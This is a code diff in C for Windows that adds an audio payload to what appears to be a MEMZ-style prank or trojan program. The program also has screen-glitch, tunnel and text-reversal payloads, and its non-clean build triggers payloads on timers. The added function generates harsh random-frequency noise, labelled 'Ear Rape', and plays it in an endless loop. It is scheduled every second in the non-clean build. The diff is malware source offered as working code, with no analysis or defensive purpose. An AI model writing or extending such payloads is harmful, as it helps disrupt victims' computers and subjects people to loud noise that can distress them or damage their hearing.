@@ -12,6 +12,7 @@ PAYLOAD payloads[] = {
 	{ payloadHostDefault, (LPVOID)payloadReverseText, L"Reverse text", FALSE, 0, 0, 0, 0, 0 },
 	{ payloadHostVisual, (LPVOID)payloadTunnel, L"Tunnel effect", TRUE, 0, 0, 0, 0, 0 },
 	{ payloadHostVisual, (LPVOID)payloadGlitches, L"Screen glitches", TRUE, 0, 0, 0, 0, 0 },
+	{ payloadHostCrazyBus, NULL, L"Crazy Bus (Ear Rape)", TRUE, 0, 0, 0, 0, 0 },
 #else
 	{ payloadHostDefault, (LPVOID)payloadExecute, 30000, 0, 0, 0, 0 },
 	{ payloadHostDefault, (LPVOID)payloadCursor, 30000, 0, 0, 0, 0 },
@@ -23,6 +24,7 @@ PAYLOAD payloads[] = {
 	{ payloadHostDefault, (LPVOID)payloadReverseText, 40000, 0, 0, 0, 0 },
 	{ payloadHostVisual, (LPVOID)payloadTunnel, 60000, 0, 0, 0, 0 },
 	{ payloadHostVisual, (LPVOID)payloadGlitches, 15000, 0, 0, 0, 0 },
+	{ payloadHostCrazyBus, NULL, 1000, 0, 0, 0, 0 },
 #endif
 };
 
@@ -245,4 +247,48 @@ PAYLOADFUNCTIONVISUAL(payloadDrawErrors) {
 	}
 
 	out: return 2;
+}
+
+PAYLOADHOST(payloadHostCrazyBus) {
+	PAYLOAD *payload = (PAYLOAD*)parameter;
+
+	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };
+
+	HWAVEOUT hwo;
+	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);
+
+	const int bufsize = 44100 * 30; // 30 Seconds
+	char *wavedata = (char *)LocalAlloc(0, bufsize);
+
+	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
+
+	for (;;) {
+#ifdef CLEAN
+		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
+#endif
+			int freq = 0;
+			for (int i = 0; i < bufsize; i++) {
+				if (i % (44100 / 4) == 0)
+					freq = 44100 / ((random() % 4000) + 1000);
+
+				wavedata[i] = (char)(((i % freq) / ((float)freq)) * 100);
+			}
+
+			waveOutReset(hwo);
+			waveOutWrite(hwo, &hdr, sizeof(hdr));
+
+			while (!(hdr.dwFlags & WHDR_DONE) && (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED)) {
+				Sleep(1);
+			}
+
+			if (!enablePayloads || SendMessage(payload->btn, BM_GETCHECK, 0, NULL) != BST_CHECKED) {
+				waveOutPause(hwo);
+			}
+#ifdef CLEAN
+		} else {
+			Sleep(10);
+		}
+#endif
+	}
 }
